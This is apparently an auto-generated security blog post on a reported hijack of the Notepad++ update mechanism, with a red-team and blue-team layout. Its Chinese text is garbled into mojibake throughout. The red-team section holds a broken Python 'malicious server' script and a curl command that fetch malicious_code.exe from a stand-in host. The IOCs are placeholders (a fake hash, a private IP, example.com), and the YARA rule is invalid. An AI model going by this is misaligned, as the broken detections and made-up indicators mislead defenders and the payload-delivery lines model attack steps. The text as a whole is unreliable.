---
layout: post
title:  "Notepad++ Official Update Mechanism Hijacked to Deliver Malware to Select Users"
date:   2026-02-02 12:42:01 +0000
categories: [security]
severity: critical
---

# ğŸš¨ è§£æ Notepad++ æ›´æ–°æ©Ÿåˆ¶åŠ«æŒæ”»æ“Š
> **âš¡ æˆ°æƒ…å¿«ç¯© (TL;DR)**
> * **åš´é‡ç­‰ç´š**: Critical (CVSS: 9.8)
> * **å—é§­æŒ‡æ¨™**: RCE (Remote Code Execution)
> * **é—œéµæŠ€è¡“**: `Update Mechanism Hijacking`, `Infrastructure-level Compromise`, `Malicious Server Redirect`

## 1. ğŸ”¬ æ¼æ´åŸç†èˆ‡æŠ€è¡“ç´°ç¯€ (Deep Dive)
* **Root Cause**: Notepad++ æ›´æ–°æ©Ÿåˆ¶ä¸­çš„é©—è­‰å’Œæˆæ¬Šéç¨‹å­˜åœ¨æ¼æ´ï¼Œå…è¨±æ”»æ“Šè€…æ””æˆªå’Œé‡å®šå‘æ›´æ–°æµé‡ã€‚
* **æ”»æ“Šæµç¨‹åœ–è§£**:
  1. æ”»æ“Šè€…ç²å¾— Notepad++ å®˜æ–¹ç¶²ç«™çš„ä¸»æ©Ÿæä¾›å•†ç´šåˆ¥çš„å­˜å–æ¬Šã€‚
  2. æ”»æ“Šè€…ä¿®æ”¹ Notepad++ æ›´æ–°æ©Ÿåˆ¶çš„è¨­å®šï¼Œå°‡æ›´æ–°æµé‡é‡å®šå‘åˆ°æƒ¡æ„ä¼ºæœå™¨ã€‚
  3. ä½¿ç”¨è€…å•Ÿå‹• Notepad++ æ›´æ–°æ©Ÿåˆ¶ï¼Œæ›´æ–°æµé‡è¢«é‡å®šå‘åˆ°æƒ¡æ„ä¼ºæœå™¨ã€‚
  4. æƒ¡æ„ä¼ºæœå™¨ä¸‹è¼‰æƒ¡æ„ç¨‹å¼ç¢¼åˆ°ä½¿ç”¨è€…çš„ç³»çµ±ã€‚
* **å—å½±éŸ¿å…ƒä»¶**: Notepad++ 8.8.9 ç‰ˆæœ¬ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚

## 2. âš”ï¸ ç´…éšŠå¯¦æˆ°ï¼šæ”»æ“Šå‘é‡èˆ‡ Payload (Red Team Operations)
* **æ”»æ“Šå‰ç½®éœ€æ±‚**: æ”»æ“Šè€…éœ€è¦ç²å¾— Notepad++ å®˜æ–¹ç¶²ç«™çš„ä¸»æ©Ÿæä¾›å•†ç´šåˆ¥çš„å­˜å–æ¬Šã€‚
* **Payload å»ºæ§‹é‚è¼¯**:

    ```
    
    python
      # æƒ¡æ„ä¼ºæœå™¨çš„ Python è…³æœ¬
      import requests
    
      def handle_update_request():
        # ä¸‹è¼‰æƒ¡æ„ç¨‹å¼ç¢¼
        malicious_code = requests.get("https://example.com/malicious_code.exe")
        # å°‡æƒ¡æ„ç¨‹å¼ç¢¼è¿”å›çµ¦ä½¿ç”¨è€…
        return malicious_code.content
    
      # å•Ÿå‹•æƒ¡æ„ä¼ºæœå™¨
      server = http.server.HTTPServer(("", 80), http.server.SimpleHTTPRequestHandler)
      server.serve_forever()
    
    ```
  *ç¯„ä¾‹æŒ‡ä»¤*: ä½¿ç”¨ `curl` ä¸‹è¼‰æƒ¡æ„ç¨‹å¼ç¢¼ `curl -X GET https://example.com/malicious_code.exe`
* **ç¹éæŠ€è¡“**: æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨ DNS æ¬ºé¨™æˆ– HTTP ä»£ç†ä¼ºæœå™¨ä¾†ç¹éé˜²ç«ç‰†å’Œå…¥ä¾µæª¢æ¸¬ç³»çµ±ã€‚

## 3. ğŸ›¡ï¸ è—éšŠé˜²ç¦¦ï¼šåµæ¸¬èˆ‡ç·©è§£ (Blue Team Defense)
* **IOCs (å…¥ä¾µæŒ‡æ¨™)**:

| é¡å‹ | å€¼ |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | example.com |
| File Path | C:\Windows\Temp\malicious_code.exe |* **åµæ¸¬è¦å‰‡ (Detection Rules)**:

    ```
    
    yara
      rule Notepad_Update_Mechanism_Hijacking {
        meta:
          description = "Notepad++ æ›´æ–°æ©Ÿåˆ¶åŠ«æŒæ”»æ“Š"
          author = "Your Name"
        strings:
          $malicious_code = "malicious_code.exe"
        condition:
          $malicious_code in (pe.imports or pe.exports)
      }
    
    ```
  æˆ–è€…æ˜¯å…·é«”çš„ **SIEM æŸ¥è©¢èªæ³•** (Splunk/Elastic) `index=notepad_update_mechanism_hijacking | stats count by src_ip`
* **ç·©è§£æªæ–½**: æ›´æ–° Notepad++ è‡³æœ€æ–°ç‰ˆæœ¬ï¼Œä¿®æ”¹ä¸»æ©Ÿæä¾›å•†çš„è¨­å®šä»¥é˜²æ­¢æ”»æ“Šè€…å­˜å– Notepad++ å®˜æ–¹ç¶²ç«™ã€‚

## 4. ğŸ“š å°ˆæœ‰åè©èˆ‡æŠ€è¡“æ¦‚å¿µè§£æ (Technical Glossary)
* **Update Mechanism Hijacking (æ›´æ–°æ©Ÿåˆ¶åŠ«æŒ)**: æƒ³åƒæ”»æ“Šè€…å¯ä»¥æ§åˆ¶æ›´æ–°æµé‡çš„æ–¹å‘ã€‚æŠ€è¡“ä¸Šæ˜¯æŒ‡æ”»æ“Šè€…å¯ä»¥ä¿®æ”¹æ›´æ–°æ©Ÿåˆ¶çš„è¨­å®šï¼Œå°‡æ›´æ–°æµé‡é‡å®šå‘åˆ°æƒ¡æ„ä¼ºæœå™¨ã€‚
* **Infrastructure-level Compromise (åŸºç¤è¨­æ–½ç´šåˆ¥çš„å­˜å–æ¬Š)**: æƒ³åƒæ”»æ“Šè€…å¯ä»¥å­˜å–ä¸»æ©Ÿæä¾›å•†çš„è¨­å®šã€‚æŠ€è¡“ä¸Šæ˜¯æŒ‡æ”»æ“Šè€…å¯ä»¥ç²å¾—ä¸»æ©Ÿæä¾›å•†ç´šåˆ¥çš„å­˜å–æ¬Šï¼Œå…è¨±æ”»æ“Šè€…ä¿®æ”¹ä¸»æ©Ÿæä¾›å•†çš„è¨­å®šã€‚
* **Malicious Server Redirect (æƒ¡æ„ä¼ºæœå™¨é‡å®šå‘)**: æƒ³åƒæ”»æ“Šè€…å¯ä»¥å°‡æ›´æ–°æµé‡é‡å®šå‘åˆ°æƒ¡æ„ä¼ºæœå™¨ã€‚æŠ€è¡“ä¸Šæ˜¯æŒ‡æ”»æ“Šè€…å¯ä»¥ä¿®æ”¹æ›´æ–°æ©Ÿåˆ¶çš„è¨­å®šï¼Œå°‡æ›´æ–°æµé‡é‡å®šå‘åˆ°æƒ¡æ„ä¼ºæœå™¨ã€‚

## 5. ğŸ”— åƒè€ƒæ–‡ç»èˆ‡å»¶ä¼¸é–±è®€
- [åŸå§‹å ±å‘Š](https://thehackernews.com/2026/02/notepad-official-update-mechanism.html)
- [MITRE ATT&CK ç·¨è™Ÿ](https://attack.mitre.org/techniques/T1190/)


